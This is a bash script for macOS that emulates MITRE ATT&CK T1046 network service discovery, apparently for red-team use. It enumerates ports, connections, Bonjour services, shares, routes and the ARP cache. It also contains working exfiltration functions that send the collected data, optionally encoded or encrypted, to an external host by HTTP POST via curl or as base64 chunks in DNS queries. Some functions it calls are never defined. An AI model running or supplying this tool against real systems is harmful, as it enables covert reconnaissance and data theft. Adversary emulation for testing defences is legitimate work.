#!/bin/bash

# Script Name: network_service.sh
# MITRE ATT&CK Technique: T1046 - Network Service Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 1.1

# Description:
# This script performs network service discovery on macOS systems using native commands.
# It identifies applications and services that are listening on system ports.
# The script focuses on discovering network services, their states, and configurations.

# References:
# - https://attack.mitre.org/techniques/T1046/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md

# Global Variables
NAME="network_service"
TACTIC="discovery"
TTP_ID="T1046"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
ALL=false
CHUNK_SIZE=1000
RATE_LIMIT=0.5  # Delay between operations in seconds

# Command Variables
CMD_NETSTAT="netstat"
CMD_LSOF="lsof"
CMD_NC="nc"
CMD_LAUNCHCTL="launchctl"
CMD_SCUTIL="scutil"
CMD_NETWORKSETUP="networksetup"
CMD_SYSCTL="sysctl"
CMD_FS_USAGE="fs_usage"
CMD_PROC_INFO="/usr/sbin/proc_info"
CMD_SYSTEM_PROFILER="system_profiler"
CMD_ROUTE="route"
CMD_ARP="arp"
CMD_NETTOP="nettop"
CMD_DNSSD="dns-sd"                    # Bonjour service discovery
CMD_MDNSRESPONDER="mDNSResponder"     # Bonjour daemon
CMD_AVAHI="avahi-browse"              # Alternative mDNS browser
CMD_MDFIND="mdfind"                   # Spotlight search for network shares
CMD_SHARING="sharing"                  # macOS sharing service control
CMD_DISCOVERYD="discoveryd"           # Network service discovery daemon
CMD_AIRPORT="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"  # Wireless interface tool
CMD_NETWORKQUALITY="networkQuality"    # Network performance testing
CMD_IPCONFIG="ipconfig"               # IP configuration tool
CMD_DEFAULTS="/usr/bin/defaults"
CMD_PLUTIL="/usr/bin/plutil"
CMD_SECURITY="/usr/bin/security"
CMD_DTRACE="dtrace"                   # For syscall tracing
CMD_VMMAP="vmmap"                     # For memory mapping analysis
CMD_HEAP="heap"                       # For heap analysis
CMD_DTRUSS="dtruss"                   # For system call tracing

# Input Variables
INPUT_PROTOCOL=""
INPUT_PORT=""
INPUT_SERVICE=""
INPUT_INTERFACE=""
INPUT_TIMEOUT=10
INPUT_RATE_LIMIT=0.5
INPUT_MAX_DEPTH=5
INPUT_FILTER=""
INPUT_FORMAT="raw"

# Error handling function
handle_error() {
    local error_msg="$1"
    local error_code="${2:-1}"
    echo "[ERROR] $(date '+%Y-%m-%d %H:%M:%S') - $error_msg" >&2
    if [ "$LOG_ENABLED" = true ]; then
        echo "[ERROR] $(date '+%Y-%m-%d %H:%M:%S') - $error_msg" >> "$LOG_FILE"
    fi
    return "$error_code"
}

# Input validation function
validate_input() {
    local input="$1"
    local input_type="$2"
    
    case "$input_type" in
        "port")
            if ! [[ "$input" =~ ^[0-9]+$ ]] || [ "$input" -lt 1 ] || [ "$input" -gt 65535 ]; then
                handle_error "Invalid port number: $input"
                return 1
            fi
            ;;
        "protocol")
            if ! [[ "$input" =~ ^(tcp|udp|all)$ ]]; then
                handle_error "Invalid protocol: $input"
                return 1
            fi
            ;;
        "service")
            if ! [[ "$input" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                handle_error "Invalid service name: $input"
                return 1
            fi
            ;;
    esac
    return 0
}

# Rate limiting function
rate_limit() {
    sleep "$RATE_LIMIT"
}

# Process isolation function
isolate_process() {
    local cmd="$1"
    local timeout="${2:-10}"  # Default timeout of 10 seconds
    
    # Run command in background with timeout
    timeout "$timeout" bash -c "$cmd" &
    local pid=$!
    
    # Wait for completion or timeout
    wait "$pid" 2>/dev/null || {
        kill -9 "$pid" 2>/dev/null
        handle_error "Command timed out: $cmd"
        return 1
    }
}

# Function to discover Bonjour services
discover_bonjour_services() {
    local service_types=(
        "_ssh._tcp"
        "_afpovertcp._tcp"
        "_smb._tcp"
        "_printer._tcp"
        "_ipp._tcp"
        "_http._tcp"
        "_https._tcp"
        "_rdp._tcp"
        "_sftp-ssh._tcp"
        "_webdav._tcp"
        "_companion-link._tcp"
        "_device-info._tcp"
        "_workstation._tcp"
        "_adisk._tcp"
    )
    
    # Direct command output for service discovery
    for service in "${service_types[@]}"; do
        if [ "$VERBOSE" = true ]; then
            log_cmd_exec "$CMD_DNSSD" "Discovering $service"
        fi
        $CMD_DNSSD -B "$service" . & sleep "${INPUT_TIMEOUT:-2}"; kill $!
        sleep "${INPUT_RATE_LIMIT:-0.5}"
    done

    # Direct command output for mDNSResponder status
    if [ "$VERBOSE" = true ]; then
        log_cmd_exec "$CMD_MDNSRESPONDER" "Getting mDNS status"
    fi
    ps aux | grep mDNSResponder | grep -v grep
    sudo killall -INFO mDNSResponder 2>/dev/null
}

# Function to discover network services
discover_network_services() {
    if [ "$VERBOSE" = true ]; then
        log_cmd_exec "$CMD_LAUNCHCTL" "Discovering network services"
    fi
    $CMD_LAUNCHCTL list | grep -i "net\|web\|ftp\|ssh\|smb\|afp"
    
    if [ "$VERBOSE" = true ]; then
        log_cmd_exec "$CMD_SCUTIL" "Getting network service states"
    fi
    $CMD_SCUTIL --nc list

    # Direct port scanning if port specified
    if [ -n "$INPUT_PORT" ]; then
        if validate_input "$INPUT_PORT" "port"; then
            if [ "$VERBOSE" = true ]; then
                log_cmd_exec "$CMD_NC" "Scanning port $INPUT_PORT"
            fi
            echo "" | nc -w "${INPUT_TIMEOUT:-3}" localhost "$INPUT_PORT"
        fi
    fi
}

# Function to discover network memory mappings
discover_network_memory() {
    if [ "$VERBOSE" = true ]; then
        log_cmd_exec "$CMD_LSOF" "Getting network processes"
    fi
    
    $CMD_LSOF -i -n -P | grep -v "grep" | grep -v "kernel" | \
    while read -r line; do
        pid=$(echo "$line" | awk '{print $2}')
        pname=$(echo "$line" | awk '{print $1}')
        
        if [ -n "$pid" ] && [ "$pid" -ne 0 ] && kill -0 "$pid" 2>/dev/null; then
            if [ "$VERBOSE" = true ]; then
                log_cmd_exec "$CMD_VMMAP" "Analyzing memory for $pname ($pid)"
            fi
            timeout "${INPUT_TIMEOUT:-10}" $CMD_VMMAP "$pid" 2>/dev/null | \
            grep -iE 'network|socket|port|tcp|udp|ip|dns|http|https'
            
            if [ "$VERBOSE" = true ]; then
                log_cmd_exec "$CMD_LSOF" "Getting connections for $pname ($pid)"
            fi
            $CMD_LSOF -i -n -P -p "$pid" 2>/dev/null
        fi
        sleep "${INPUT_RATE_LIMIT:-0.5}"
    done
}

# Log execution of a command
log_cmd_exec() {
    local cmd="$1"
    local purpose="$2"
    if [ "$VERBOSE" = true ]; then
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Executing: $cmd for $purpose" >&2
    fi
}

# Display help message
display_help() {
    cat << 'EOF'
Usage: $0 [OPTIONS]

Description:
  T1046 - Network Service Discovery: Adversaries may attempt to get a listing 
  of services running on remote or local hosts and their associated ports.

Options:
  General:
    --help                 Show this help message
    --verbose             Enable detailed output
    --log                 Log output to file (rotates at 5MB)
    --all                 Run all discovery methods

  Discovery Methods:
    --netstat-ports       Basic port enumeration using netstat
    --lsof-sockets       Network socket enumeration using lsof
    --scutil-state       Network connection state discovery using scutil
    --sysctl-params      Kernel-level socket enumeration using sysctl
    --procinfo-net       Process network relationship discovery using proc_info
    --dnssd-services     Discover Bonjour/mDNS services using dns-sd
    --mdfind-shares      Discover network shares using Spotlight (mdfind)
    --sharing-info       List sharing services configuration
    --airport-scan       Discover wireless networks using airport
    --route-info         Display routing information
    --arp-cache         Show ARP cache entries
    --net-quality       Test network quality using networkQuality
    --net-syscalls      Trace network syscalls using dtrace (requires root)
    --net-memory        Analyze network memory mappings using vmmap
    --networksetup      Network configuration using networksetup
EOF
}

# Core network service discovery functions that emulate actual adversary behavior
discover_listening_ports() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering listening ports:\n"
    
    # netstat - Most commonly used by adversaries for port discovery
    log_cmd_exec "$CMD_NETSTAT" "TCP port discovery"
    output+="[+] Listening TCP ports (using $CMD_NETSTAT):\n"
    output+="$($CMD_NETSTAT -an -p tcp | grep LISTEN)\n"
    
    log_cmd_exec "$CMD_NETSTAT" "UDP port discovery"
    output+="[+] Listening UDP ports (using $CMD_NETSTAT):\n"
    output+="$($CMD_NETSTAT -an -p udp)\n"
    
    # lsof - Alternative method for port discovery
    log_cmd_exec "$CMD_LSOF" "Process-port mapping discovery"
    output+="[+] Process-port mappings (using $CMD_LSOF):\n"
    output+="$($CMD_LSOF -i -n -P | grep LISTEN)\n"
    
    echo -e "$output"
}

discover_interface_details() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering network interfaces:\n"
    
    # networksetup - Used to get network interface configuration
    log_cmd_exec "$CMD_NETWORKSETUP" "Network interface discovery"
    output+="[+] Network hardware ports (using $CMD_NETWORKSETUP):\n"
    output+="$($CMD_NETWORKSETUP -listallhardwareports)\n"
    
    # scutil - Used to get network interface details
    log_cmd_exec "$CMD_SCUTIL" "Network interface state discovery"
    output+="[+] Network interface details (using $CMD_SCUTIL):\n"
    output+="$($CMD_SCUTIL --nwi)\n"
    
    echo -e "$output"
}

discover_established_connections() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering established connections:\n"
    
    # netstat - Used to identify established connections
    output+="[+] Established TCP connections:\n"
    output+="$($CMD_NETSTAT -an -p tcp | grep ESTABLISHED)\n"
    
    # lsof - Alternative method for connection discovery
    output+="[+] Process connection details:\n"
    output+="$($CMD_LSOF -i -n -P | grep ESTABLISHED)\n"
    
    echo -e "$output"
}

discover_stealthy_network() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Stealthy network discovery:\n"
    
    # sysctl for network kernel parameters
    log_cmd_exec "$CMD_SYSCTL" "Kernel network parameter discovery"
    output+="[+] Network kernel parameters (using $CMD_SYSCTL):\n"
    local cmd="$CMD_SYSCTL -n net.inet.tcp.pcblist net.inet.udp.pcblist 2>/dev/null"
    output+="$(isolate_process "$cmd")\n"
    
    # fs_usage for network file operations (requires root)
    if [ "$(id -u)" = "0" ]; then
        log_cmd_exec "$CMD_FS_USAGE" "Network file operation discovery"
        output+="[+] Network file operations (using $CMD_FS_USAGE):\n"
        local cmd="$CMD_FS_USAGE -w -f filesystem 2>/dev/null | grep -i 'network\|socket' | head -n 10"
        output+="$(isolate_process "$cmd" 5)\n"
    fi
    
    # proc_info for process network info
    log_cmd_exec "$CMD_PROC_INFO" "Process network information discovery"
    output+="[+] Process network information (using $CMD_PROC_INFO):\n"
    local cmd="$CMD_PROC_INFO -v 2>/dev/null | grep -i 'network\|socket'"
    output+="$(isolate_process "$cmd")\n"
    
    # Check for listening daemons
    output+="[+] Network-related daemons:\n"
    local daemons=(
        "mDNSResponder"
        "discoveryd"
        "networkd"
        "configd"
        "socketfilterfw"
        "pppd"
        "racoon"
        "vpnd"
    )
    
    for daemon in "${daemons[@]}"; do
        rate_limit
        local cmd="pgrep -l $daemon"
        output+="[*] $daemon status:\n"
        output+="$(isolate_process "$cmd")\n"
    done
    
    echo -e "$output"
}

discover_kernel_network() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Kernel-level network discovery:\n"
    
    # DTrace for network syscalls (requires root)
    if [ "$(id -u)" = "0" ]; then
        log_cmd_exec "$CMD_DTRACE" "Network syscall tracing"
        output+="[+] Network syscalls (using $CMD_DTRACE):\n"
        output+="$($CMD_DTRACE -n 'syscall::socket*:entry { printf(\"%s (%d)\", execname, pid); }' 2>/dev/null | head -n 5)\n"
    fi
    
    # System profiler for detailed network info
    log_cmd_exec "$CMD_SYSTEM_PROFILER" "Detailed network configuration discovery"
    output+="[+] Detailed network configuration (using $CMD_SYSTEM_PROFILER):\n"
    output+="$($CMD_SYSTEM_PROFILER SPNetworkDataType 2>/dev/null)\n"
    
    echo -e "$output"
}

# New discovery functions for specific tools

# Function to discover network shares using mdfind (Spotlight)
discover_mdfind_shares() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering network shares using mdfind:\n"
    
    # Search for different mount types using Spotlight
    local mount_types=(
        "smbfs"    # SMB mounts
        "afpfs"    # AFP mounts
        "nfs"      # NFS mounts
        "webdav"   # WebDAV mounts
        "cifs"     # CIFS mounts
    )
    
    for mount_type in "${mount_types[@]}"; do
        rate_limit
        output+="[*] Discovering $mount_type mounts:\n"
        local cmd="$CMD_MDFIND 'kMDItemFSType == \"$mount_type\"'"
        output+="$(isolate_process "$cmd")\n"
    done
    
    echo -e "$output"
}

# Function to discover network shares using sharing command
discover_sharing_services() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering sharing services:\n"
    
    # Check configured sharing services
    log_cmd_exec "$CMD_SHARING" "Sharing service enumeration"
    output+="[+] Configured sharing services:\n"
    local cmd="$CMD_SHARING -l"
    output+="$(isolate_process "$cmd")\n"
    
    # Check active mount points
    output+="[+] Active mount points:\n"
    output+="$(mount | grep -E 'smbfs|afpfs|nfs|webdav|cifs')\n"
    
    echo -e "$output"
}

# Function to discover network configuration using networksetup
discover_networksetup_config() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering network configuration:\n"
    
    # List all network services
    output+="[+] Network services:\n"
    local cmd="$CMD_NETWORKSETUP -listallnetworkservices"
    output+="$(isolate_process "$cmd")\n"
    
    # List all hardware ports
    output+="[+] Hardware ports:\n"
    cmd="$CMD_NETWORKSETUP -listallhardwareports"
    output+="$(isolate_process "$cmd")\n"
    
    # Get DHCP info for each active interface
    local interfaces=$($CMD_NETWORKSETUP -listallnetworkservices | tail -n +2)
    for interface in $interfaces; do
        output+="[+] DHCP info for $interface:\n"
        cmd="$CMD_NETWORKSETUP -getinfo \"$interface\""
        output+="$(isolate_process "$cmd")\n"
    done
    
    echo -e "$output"
}

# Function to discover network routes using route command
discover_route_info() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering network routes:\n"
    
    # Get routing table
    output+="[+] Routing table:\n"
    local cmd="$CMD_ROUTE -n get default"
    output+="$(isolate_process "$cmd")\n"
    
    # Get all routes
    output+="[+] All routes:\n"
    cmd="$CMD_ROUTE -n show"
    output+="$(isolate_process "$cmd")\n"
    
    echo -e "$output"
}

# Function to discover ARP cache using arp command
discover_arp_cache() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering ARP cache:\n"
    
    # Get ARP table
    output+="[+] ARP table:\n"
    local cmd="$CMD_ARP -a"
    output+="$(isolate_process "$cmd")\n"
    
    echo -e "$output"
}

# Function to discover network quality using networkQuality
discover_network_quality() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Testing network quality:\n"
    
    if command -v networkQuality >/dev/null 2>&1; then
        output+="[+] Network quality test:\n"
        local cmd="$CMD_NETWORKQUALITY -v"
        output+="$(isolate_process "$cmd" 30)\n"
    else
        output+="[!] networkQuality command not available\n"
    fi
    
    echo -e "$output"
}

# Function to discover network syscalls using dtrace
discover_network_syscalls() {
    local output=""
    output+="[$(date '+%Y-%m-%d %H:%M:%S')] Discovering network syscalls:\n"
    
    if [ "$(id -u)" = "0" ]; then
        output+="[+] Network-related syscalls:\n"
        local cmd="$CMD_DTRACE -n 'syscall::socket*:entry { printf(\"%s (%d)\", execname, pid); }' 2>/dev/null"
        output+="$(isolate_process "$cmd" 5)\n"
        
        output+="[+] Network connect syscalls:\n"
        cmd="$CMD_DTRACE -n 'syscall::connect*:entry { printf(\"%s (%d)\", execname, pid); }' 2>/dev/null"
        output+="$(isolate_process "$cmd" 5)\n"
    else
        output+="[!] Root privileges required for syscall tracing\n"
    fi
    
    echo -e "$output"
}

# Standard exfiltration functions
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    
    if [ -z "$data" ] || [ -z "$uri" ]; then
        log_to_stdout "Error: Missing data or URI for HTTP exfiltration" "exfiltrate_http" ""
        return 1
    fi
    
    curl -s -X POST "$uri" -d "$data" 2>/dev/null
}

exfiltrate_dns() {
    local data="$1"
    local domain="$2"
    local id="${3:-$(date +%s)}"
    
    if [ -z "$data" ] || [ -z "$domain" ]; then
        log_to_stdout "Error: Missing data or domain for DNS exfiltration" "exfiltrate_dns" ""
        return 1
    fi
    
    local chunks
    chunks=$(echo "$data" | base64 | fold -w 63)
    while IFS= read -r chunk; do
        dig @8.8.8.8 "$chunk.$domain" +short
        sleep 0.1
    done <<< "$chunks"
}

# Process output function
process_output() {
    local output="$1"
    local processed_output="$output"
    
    # Encode if specified
    case "$ENCODE" in
        "b64"|"base64")
            processed_output=$(echo "$output" | base64)
            ;;
        "hex"|"xxd")
            processed_output=$(echo "$output" | xxd -p)
            ;;
        "perl_b64")
            processed_output=$(perl -MMIME::Base64 -e "print encode_base64('$output');")
            ;;
        "perl_utf8")
            processed_output=$(perl -e "use utf8; print '$output';")
            ;;
    esac
    
    # Encrypt if specified
    case "$ENCRYPT" in
        "aes")
            processed_output=$(echo "$processed_output" | openssl enc -aes-256-cbc -a -k "$ENCRYPT_KEY")
            ;;
        "blowfish")
            processed_output=$(echo "$processed_output" | openssl enc -bf-cbc -a -k "$ENCRYPT_KEY")
            ;;
        "gpg")
            processed_output=$(echo "$processed_output" | gpg --symmetric --batch --passphrase "$ENCRYPT_KEY")
            ;;
    esac
    
    # Log if enabled
    if [ "$LOG_ENABLED" = true ]; then
        echo "$processed_output" >> "$LOG_FILE"
    fi
    
    # Exfiltrate if enabled
    if [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            exfiltrate_dns "$processed_output" "$EXFIL_URI"
        else
            exfiltrate_http "$processed_output" "$EXFIL_URI"
        fi
    fi
    
    echo "$processed_output"
}

# Main function
main() {
    local output=""
    local error_count=0
    local success_count=0
    
    # If no arguments provided, show help
    if [ "$#" -eq 0 ]; then
        display_help
        exit 1
    fi
    
    # Process command line arguments
    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            --help)
                display_help
                exit 0
                ;;
            --verbose)
                VERBOSE=true
                ;;
            --log)
                LOG_ENABLED=true
                ;;
            --all)
                ALL=true
                local discovery_functions=(
                    "discover_listening_ports"
                    "discover_network_services"
                    "discover_interface_details"
                    "discover_established_connections"
                    "discover_stealthy_network"
                    "discover_kernel_network"
                    "discover_bonjour_services"
                    "discover_mdfind_shares"
                    "discover_sharing_services"
                    "discover_networksetup_config"
                    "discover_route_info"
                    "discover_arp_cache"
                    "discover_network_quality"
                    "discover_network_syscalls"
                    "discover_network_memory"
                )
                for func in "${discovery_functions[@]}"; do
                    rate_limit
                    if output_temp="$($func)"; then
                        output+="$output_temp\n"
                        ((success_count++))
                    else
                        handle_error "Failed to execute $func"
                        ((error_count++))
                    fi
                done
                ;;
            --netstat-ports)
                if output_temp="$(discover_listening_ports)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Port scan failed"
                    ((error_count++))
                fi
                ;;
            --lsof-sockets)
                if output_temp="$(discover_established_connections)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Socket enumeration failed"
                    ((error_count++))
                fi
                ;;
            --scutil-state)
                if output_temp="$(discover_interface_details)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Network state discovery failed"
                    ((error_count++))
                fi
                ;;
            --sysctl-params)
                if output_temp="$(discover_stealthy_network)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Kernel socket discovery failed"
                    ((error_count++))
                fi
                ;;
            --procinfo-net)
                if output_temp="$(discover_kernel_network)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Process network discovery failed"
                    ((error_count++))
                fi
                ;;
            --dnssd-services)
                if output_temp="$(discover_bonjour_services)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Bonjour service discovery failed"
                    ((error_count++))
                fi
                ;;
            --mdfind-shares)
                if output_temp="$(discover_mdfind_shares)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Network share discovery failed"
                    ((error_count++))
                fi
                ;;
            --sharing-info)
                if output_temp="$(discover_sharing_services)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Sharing service discovery failed"
                    ((error_count++))
                fi
                ;;
            --airport-scan)
                if output_temp="$(discover_wireless_networks)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Wireless network discovery failed"
                    ((error_count++))
                fi
                ;;
            --route-info)
                if output_temp="$(discover_route_info)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Route information discovery failed"
                    ((error_count++))
                fi
                ;;
            --arp-cache)
                if output_temp="$(discover_arp_cache)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "ARP cache discovery failed"
                    ((error_count++))
                fi
                ;;
            --net-quality)
                if output_temp="$(discover_network_quality)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Network quality test failed"
                    ((error_count++))
                fi
                ;;
            --net-syscalls)
                if output_temp="$(discover_network_syscalls)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Network syscall tracing failed"
                    ((error_count++))
                fi
                ;;
            --net-memory)
                if output_temp="$(discover_network_memory)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Network memory mapping analysis failed"
                    ((error_count++))
                fi
                ;;
            --networksetup)
                if output_temp="$(discover_networksetup_config)"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Network configuration discovery failed"
                    ((error_count++))
                fi
                ;;
            --protocols=*)
                protocol="${1#*=}"
                if validate_input "$protocol" "protocol"; then
                    case "$protocol" in
                        "tcp")
                            output+="$($CMD_NETSTAT -an -p tcp)\n"
                            ((success_count++))
                            ;;
                        "udp")
                            output+="$($CMD_NETSTAT -an -p udp)\n"
                            ((success_count++))
                            ;;
                        "all")
                            output+="$($CMD_NETSTAT -an)\n"
                            ((success_count++))
                            ;;
                    esac
                else
                    ((error_count++))
                fi
                ;;
            --port=*)
                port="${1#*=}"
                if validate_input "$port" "port"; then
                    if output_temp="$(fingerprint_service "127.0.0.1" "$port")"; then
                        output+="$output_temp\n"
                        ((success_count++))
                    else
                        handle_error "Port fingerprinting failed for port $port"
                        ((error_count++))
                    fi
                else
                    ((error_count++))
                fi
                ;;
            --process=*)
                process="${1#*=}"
                if output_temp="$($CMD_LSOF -i -n -P | grep -i "$process")"; then
                    output+="$output_temp\n"
                    ((success_count++))
                else
                    handle_error "Process network discovery failed for $process"
                    ((error_count++))
                fi
                ;;
            --encode=*)
                ENCODE="${1#*=}"
                ;;
            --exfil=http://*)
                EXFIL=true
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
                ;;
            --exfil=dns=*)
                EXFIL=true
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=}"
                ;;
            --encrypt=*)
                ENCRYPT="${1#*=}"
                ENCRYPT_KEY=$(openssl rand -hex 32)
                ;;
            *)
                handle_error "Invalid option: $1"
                display_help
                exit 1
                ;;
        esac
        shift
    done

    # If no discovery options were selected
    if [ -z "$output" ] && [ "$LOG_ENABLED" = false ] && [ "$VERBOSE" = false ]; then
        handle_error "No discovery options selected"
        display_help
        exit 1
    fi

    # Create log file if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        if [ ! -f "$LOG_FILE" ]; then
            touch "$LOG_FILE"
            chmod 600 "$LOG_FILE"
        fi
        # Rotate log if it exceeds 5MB
        if [ -f "$LOG_FILE" ] && [ "$(stat -f%z "$LOG_FILE")" -gt 5242880 ]; then
            mv "$LOG_FILE" "${LOG_FILE}.old"
            touch "$LOG_FILE"
            chmod 600 "$LOG_FILE"
        fi
        echo -e "$output" >> "$LOG_FILE"
    fi

    # Print summary if verbose
    if [ "$VERBOSE" = true ]; then
        printf '[SUMMARY] Successful operations: %d, Failed operations: %d\n' "$success_count" "$error_count" >&2
    fi
    process_output "$output"
}

# Execute main function with all arguments
main "$@" 